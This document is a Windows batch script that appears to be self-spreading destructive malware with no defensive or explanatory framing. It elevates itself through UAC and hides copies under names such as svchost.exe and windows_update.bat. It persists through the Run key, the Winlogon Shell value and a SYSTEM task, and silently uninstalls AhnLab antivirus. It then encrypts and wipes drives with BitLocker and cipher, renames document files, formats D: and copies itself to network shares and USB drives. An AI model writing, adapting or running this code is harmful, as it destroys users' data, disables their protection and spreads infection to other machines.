@echo off
setlocal
set me=%~f0
set watcher=%temp%\watcher.bat

(
echo @echo off
echo :loop
echo tasklist /fi "imagename eq cmd.exe" /v ^| find /i "killllik2.5.bat" ^>nul
echo if errorlevel 1 start "" "%me%"
echo timeout /t 1 ^>nul
echo goto loop
) > "%watcher%"

powershell -WindowStyle Hidden -Command "Start-Process '%watcher%' -WindowStyle Hidden"
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

setlocal enabledelayedexpansion

copy "%~f0" "C:\Windows\System32\drivers\svchost.exe" >nul 2>&1
copy "%~f0" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\windows_update.bat" >nul 2>&1
copy "%~f0" "C:\Users\Public\Documents\system_cache.dat" >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSystem" /t REG_SZ /d "C:\Windows\System32\drivers\svchost.exe" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\Windows\System32\drivers\svchost.exe" /f >nul 2>&1
schtasks /create /tn "MicrosoftWindowsUpdate" /tr "C:\Windows\System32\drivers\svchost.exe" /sc onstart /ru SYSTEM /f >nul 2>&1

for /f "delims=" %%i in ('dir /s /b c:\StSess.exe 2^>nul') do (
    taskkill /f /im "StSess.exe" >nul 2>&1
    fsutil file setzerodata offset=0 length=999999999 "%%i" >nul 2>&1
    del /f /q "%%i" >nul 2>&1
)

if exist "C:\Program Files\AhnLab\V3Clinic40\Uninst.exe" (
    "C:\Program Files\AhnLab\V3Clinic40\Uninst.exe" /S
)

for /l %%x in (1,1,26) do (
    set "drive=%%x"
    set "letter=!drive:~-1!"
    if exist !letter!:\ (
        fsutil file createnew !letter!:\dummy1.dat 1073741824 >nul 2>&1
        fsutil file createnew !letter!:\dummy2.dat 2147483648 >nul 2>&1
        fsutil file createnew !letter!:\dummy3.dat 536870912 >nul 2>&1
    )
)

for /l %%x in (1,1,26) do (
    set "drive=%%x"
    set "letter=!drive:~-1!"
    if exist !letter!:\ (
        manage-bde -on !letter!: -rp -rk >nul 2>&1
        cipher /e /s:!letter!:\ >nul 2>&1
    )
)

for /l %%i in (1,1,100) do (
    fsutil file createnew C:\temp\dummy!random!.tmp !random!000000 >nul 2>&1
)

for /R "C:\" %%F in (*.hwpx) do (
  if not exist "%%~dpnF.jpeg" ren "%%F" "%%~nF.jpeg"
)

set "DLFolder=C:\Users\%USERNAME%\Downloads"
for /R "%DLFolder%" %%F in (*) do (
    compact /c /f "%%F"
)

manage-bde -on C: -rp -rk >nul 2>&1
manage-bde -on D: -rp -rk >nul 2>&1
manage-bde -on E: -rp -rk >nul 2>&1

cipher /e /s:C:\ >nul 2>&1
cipher /w:C:\ >nul 2>&1
cipher /e /s:D:\ >nul 2>&1
cipher /e /s:E:\ >nul 2>&1

wmic pagefile list brief | find "C:" >nul && (
    wmic pagefile where name="C:\\pagefile.sys" delete >nul 2>&1
)

reg add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NtfsDisableLastAccessUpdate" /t REG_DWORD /d 1 /f >nul 2>&1

for /l %%x in (1,1,26) do (
    set "drive=%%x"
    set "letter=!drive:~-1!"
    if exist !letter!:\dummy1.dat del /f /q !letter!:\dummy*.dat >nul 2>&1
)

format D: /FS:NTFS /Q /Y >nul 2>&1

timeout /t 10 /nobreak >nul

:monitor
for /f "tokens=2 delims=" %%a in ('net use') do (
    if not "%%a"=="" (
        copy "%~f0" "%%a\system_temp.exe" >nul 2>&1
    )
)

wmic logicaldisk where "drivetype=2" get deviceid | find ":" >nul && (
    for /f "tokens=1" %%d in ('wmic logicaldisk where "drivetype=2" get deviceid ^| find ":"') do (
        copy "%~f0" "%%d\autorun.inf" >nul 2>&1
        copy "%~f0" "%%d\recycle_bin.exe" >nul 2>&1
    )
)

timeout /t 20 /nobreak >nul
goto monitor